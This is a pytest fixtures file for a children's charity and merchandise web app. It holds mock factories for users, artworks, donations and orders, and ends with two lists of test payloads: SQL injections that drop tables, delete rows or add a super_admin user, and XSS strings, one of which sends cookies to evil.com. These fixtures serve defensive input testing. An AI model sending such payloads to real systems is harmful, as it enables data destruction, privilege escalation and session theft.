"""
Shared test fixtures for Tonghua Public Welfare test suite.
Provides test database, auth helpers, and mock data factories.
"""

import asyncio
import uuid
from datetime import datetime, timedelta, timezone
from typing import AsyncGenerator, Optional

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

# ---------------------------------------------------------------------------
# Event loop
# ---------------------------------------------------------------------------

@pytest.fixture(scope="session")
def event_loop():
    """Create a session-scoped event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# ---------------------------------------------------------------------------
# Database fixtures
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture(scope="session")
async def test_db():
    """
    Set up a SQLite test database.
    In a real project, this would create tables via Alembic or SQLAlchemy.
    We mock the database layer for isolated API-level testing.
    """
    # Placeholder: in production, create SQLite engine and run migrations
    # engine = create_async_engine("sqlite+aiosqlite:///test_tonghua.db")
    # async with engine.begin() as conn:
    #     await conn.run_sync(Base.metadata.create_all)
    yield None
    # async with engine.begin() as conn:
    #     await conn.run_sync(Base.metadata.drop_all)


# ---------------------------------------------------------------------------
# Application fixture
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture(scope="session")
async def app():
    """
    Create the FastAPI application for testing.
    Imports the app from the backend module.
    """
    try:
        from backend.main import create_app
        application = create_app()
    except ImportError:
        # Fallback: create a minimal FastAPI app for testing
        from fastapi import FastAPI
        application = FastAPI(title="Tonghua Test API")
    return application


@pytest_asyncio.fixture
async def client(app) -> AsyncGenerator[AsyncClient, None]:
    """Create an async HTTP test client."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as ac:
        yield ac


# ---------------------------------------------------------------------------
# Auth token helpers
# ---------------------------------------------------------------------------

@pytest_asyncio.fixture
def auth_headers():
    """Return authorization headers with a valid test token."""
    return {
        "Authorization": "Bearer test-access-token-valid",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def expired_auth_headers():
    """Return authorization headers with an expired token."""
    return {
        "Authorization": "Bearer test-access-token-expired",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def admin_auth_headers():
    """Return authorization headers for an admin user."""
    return {
        "Authorization": "Bearer test-access-token-admin",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def guardian_auth_headers():
    """Return authorization headers for a guardian user."""
    return {
        "Authorization": "Bearer test-access-token-guardian",
        "Content-Type": "application/json",
    }


@pytest_asyncio.fixture
def no_auth_headers():
    """Headers without authorization."""
    return {"Content-Type": "application/json"}


# ---------------------------------------------------------------------------
# Mock data factories
# ---------------------------------------------------------------------------

def generate_uuid() -> str:
    """Generate a deterministic-looking UUID for tests."""
    return str(uuid.uuid4())


class MockUserFactory:
    """Factory for creating test user data."""

    @staticmethod
    def create(
        user_id: Optional[str] = None,
        email: str = "test@example.com",
        display_name: str = "Test User",
        role: str = "registered",
        is_active: bool = True,
    ) -> dict:
        return {
            "id": user_id or generate_uuid(),
            "email": email,
            "display_name": display_name,
            "role": role,
            "is_active": is_active,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }

    @staticmethod
    def guardian(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="guardian@example.com",
            display_name="Guardian User",
            role="guardian",
        )

    @staticmethod
    def admin(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="admin@tonghua.org",
            display_name="Admin User",
            role="super_admin",
        )

    @staticmethod
    def child_participant(user_id: Optional[str] = None) -> dict:
        return MockUserFactory.create(
            user_id=user_id,
            email="child@example.com",
            display_name="Little Star",
            role="child_participant",
        )


class MockArtworkFactory:
    """Factory for creating test artwork data."""

    @staticmethod
    def create(
        artwork_id: Optional[str] = None,
        title: str = "My Rainbow World",
        campaign_id: Optional[str] = None,
        status: str = "approved",
        vote_count: int = 42,
    ) -> dict:
        return {
            "id": artwork_id or generate_uuid(),
            "title": title,
            "image_url": f"https://cdn.tonghua.org/artworks/{artwork_id or 'test'}.jpg",
            "thumbnail_url": f"https://cdn.tonghua.org/artworks/{artwork_id or 'test'}_thumb.jpg",
            "display_name": "Little Star",
            "campaign_id": campaign_id or generate_uuid(),
            "campaign_title": "Colors of Hope",
            "vote_count": vote_count,
            "status": status,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


class MockCampaignFactory:
    """Factory for creating test campaign data."""

    @staticmethod
    def create(
        campaign_id: Optional[str] = None,
        title: str = "Colors of Hope",
        status: str = "active",
    ) -> dict:
        now = datetime.now(timezone.utc)
        return {
            "id": campaign_id or generate_uuid(),
            "title": title,
            "theme": "Paint your hopes for the future",
            "description": "A campaign celebrating children's creativity",
            "cover_image_url": "https://cdn.tonghua.org/campaigns/test.jpg",
            "start_date": (now - timedelta(days=30)).strftime("%Y-%m-%d"),
            "end_date": (now + timedelta(days=60)).strftime("%Y-%m-%d"),
            "status": status,
            "max_artworks": 500,
            "artwork_count": 156,
            "vote_enabled": True,
        }


class MockDonationFactory:
    """Factory for creating test donation data."""

    @staticmethod
    def create(
        donation_id: Optional[str] = None,
        amount: float = 100.00,
        status: str = "completed",
        user_id: Optional[str] = None,
    ) -> dict:
        return {
            "id": donation_id or generate_uuid(),
            "user_id": user_id or generate_uuid(),
            "amount": amount,
            "currency": "CNY",
            "status": status,
            "message": "For the children!",
            "is_anonymous": False,
            "donor_name": "Jane D.",
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


class MockProductFactory:
    """Factory for creating test product data."""

    @staticmethod
    def create(
        product_id: Optional[str] = None,
        title: str = "Rainbow Tote Bag",
        price: float = 128.00,
        category: str = "bags",
    ) -> dict:
        return {
            "id": product_id or generate_uuid(),
            "title": title,
            "description": "Handcrafted from organic cotton with natural dyes",
            "price": price,
            "materials": "100% organic cotton, natural dyes",
            "sustainability_info": "GOTS certified, carbon neutral shipping",
            "welfare_contribution": 15.00,
            "image_urls": [
                f"https://cdn.tonghua.org/products/{product_id or 'test'}_1.jpg",
                f"https://cdn.tonghua.org/products/{product_id or 'test'}_2.jpg",
            ],
            "category": category,
            "stock": 45,
            "is_active": True,
        }


class MockOrderFactory:
    """Factory for creating test order data."""

    @staticmethod
    def create(
        order_id: Optional[str] = None,
        user_id: Optional[str] = None,
        product_id: Optional[str] = None,
        status: str = "pending_payment",
    ) -> dict:
        return {
            "id": order_id or generate_uuid(),
            "user_id": user_id or generate_uuid(),
            "product_id": product_id or generate_uuid(),
            "quantity": 2,
            "unit_price": 128.00,
            "total_amount": 256.00,
            "status": status,
            "shipping_address": {
                "name": "Jane Doe",
                "phone": "+86-138-0000-0000",
                "province": "Guangdong",
                "city": "Shenzhen",
                "district": "Nanshan",
                "address": "123 Tech Park Road",
                "postal_code": "518000",
            },
            "created_at": datetime.now(timezone.utc).isoformat(),
        }


# ---------------------------------------------------------------------------
# Fixture instances of factories
# ---------------------------------------------------------------------------

@pytest.fixture
def mock_user_factory():
    return MockUserFactory


@pytest.fixture
def mock_artwork_factory():
    return MockArtworkFactory


@pytest.fixture
def mock_campaign_factory():
    return MockCampaignFactory


@pytest.fixture
def mock_donation_factory():
    return MockDonationFactory


@pytest.fixture
def mock_product_factory():
    return MockProductFactory


@pytest.fixture
def mock_order_factory():
    return MockOrderFactory


# ---------------------------------------------------------------------------
# SQL injection payloads
# ---------------------------------------------------------------------------

@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection test payloads."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM artworks WHERE 1=1 --",
        "' OR 1=1 --",
        "admin'--",
        "1' AND '1'='1",
        "' UNION SELECT null,null,null --",
        "'; INSERT INTO users (role) VALUES ('super_admin'); --",
    ]


# ---------------------------------------------------------------------------
# XSS payloads
# ---------------------------------------------------------------------------

@pytest.fixture
def xss_payloads():
    """Common XSS test payloads."""
    return [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(document.cookie)',
        '<svg onload=alert(1)>',
        '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        "<iframe src='javascript:alert(1)'>",
        '<body onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
    ]
